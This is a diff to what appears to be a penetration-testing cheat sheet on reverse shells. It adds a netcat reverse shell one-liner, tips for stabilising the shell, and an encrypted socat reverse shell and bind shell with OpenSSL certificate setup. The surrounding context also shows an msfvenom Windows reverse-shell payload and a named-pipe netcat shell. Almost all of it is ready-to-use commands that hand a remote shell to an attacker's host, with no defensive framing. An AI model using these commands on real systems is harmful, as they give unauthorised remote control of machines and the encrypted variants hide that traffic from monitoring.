@@ -40,10 +40,45 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 
 ### Sender (Victim)
 
+Simple reverse shell
+```
+nc <LOCAL-IP> <PORT> -e /bin/bash
+```
+background the shell with Ctrl + Z, then use ``stty raw -echo; fg`` to stabilise and re-enter the shell. 
+
+
 Create a reverseshell sender with namned pipe
 ```
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
+
+#### Encrypted shell
+```
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+We then need to merge the two created files into a single .pem file:
+
+``cat shell.key shell.crt > shell.pem``
+
+Now, when we set up our reverse shell listener, we use:
+
+``socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -``
+
+
+To connect back, we would use:
+
+``socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash``
+
+The same technique would apply for a bind shell:
+
+Target:
+
+``socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes``
+
+Attacker:
+
+``socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -``
+
 
 ### Listner (C&C)
 
